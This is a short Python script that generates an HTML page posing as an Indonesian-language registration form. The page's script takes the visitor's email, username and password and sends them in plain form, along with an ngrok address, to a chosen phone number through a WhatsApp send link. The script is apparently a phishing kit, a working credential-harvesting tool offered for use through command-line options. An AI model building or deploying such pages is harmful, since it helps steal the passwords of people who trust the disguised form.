import argparse

HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Form Registrasi ke WhatsApp</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        .container {
            background: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
            width: 350px;
        }

        h2 {
            margin-bottom: 20px;
            color: #333;
        }

        label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
            text-align: left;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
        }

        button {
            background-color: #25d366;
            color: white;
            padding: 12px;
            width: 100%;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: 0.3s;
        }

        button:hover {
            background-color: #1ebe5d;
        }
    </style>
</head>
<body>

    <div class="container">
        <h2>Form Registrasi</h2>
        <form id="loginForm">
            <label for="email">Email:</label>
            <input type="email" id="email" placeholder="" required>

            <label for="username">Username:</label>
            <input type="text" id="username" placeholder="" required>

            <label for="password">Password:</label>
            <input type="password" id="password" placeholder="" required>

            <button type="submit">Register</button>
        </form>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();

            let email = document.getElementById("email").value;
            let username = document.getElementById("username").value;
            let password = document.getElementById("password").value;

            let phoneNumber = "{phone_number}";
            let ngrokUrl = "{ngrok_url}";

            let message = `${ngrokUrl}/email=${encodeURIComponent(email)}&username=${encodeURIComponent(username)}&password=${encodeURIComponent(password)}`;

            let whatsappURL = `https://api.whatsapp.com/send?phone=${phoneNumber}&text=${encodeURIComponent(message)}`;

            window.location.href = whatsappURL;
        });
    </script>

</body>
</html>
"""

def generate_html(ngrok_url, phone_number, output_file):
    html_content = HTML_TEMPLATE.replace("{ngrok_url}", ngrok_url).replace("{phone_number}", phone_number)
    
    # Simpan ke file yang ditentukan
    with open(output_file, "w", encoding="utf-8") as file:
        file.write(html_content)
    
    print(f"[✅] File '{output_file}' sucessfully generated!")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Generate a custom HTML form with ngrok URL and WhatsApp number.")
    parser.add_argument("-u", "--url", required=True, help="Ngrok URL")
    parser.add_argument("-ph", "--phone", required=True, help="Whatsapp")
    parser.add_argument("-o", "--output", default="form.html", help="output file,default form.html")
    
    args = parser.parse_args()
    
    generate_html(args.url, args.phone, args.output)
